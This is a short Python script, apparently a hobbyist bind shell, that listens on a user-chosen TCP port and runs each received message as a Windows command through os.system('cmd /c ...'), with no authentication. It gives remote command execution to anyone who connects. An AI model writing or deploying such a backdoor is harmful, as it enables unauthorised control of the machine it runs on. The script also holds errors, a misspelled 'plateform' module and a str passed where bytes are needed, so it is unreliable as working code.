import socket
import platform
import os

srv_adr = input("the server adresse : ")
srv_port = int(input("the port is: "))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((srv_adr,srv_port))
s.listen(1)
connection, address = s.accept()

print("Connection with the address : ",address)

while 1:
    data = connection.recv(1024)
    if not data : break
    connection.sendall('---connect to this address---')
    print(platform.system()) 
    print(plateform.release())
    os.system('cmd /c "%s"'% (data.decode('utf-8'))) # allow to execute cmd
connection.close()
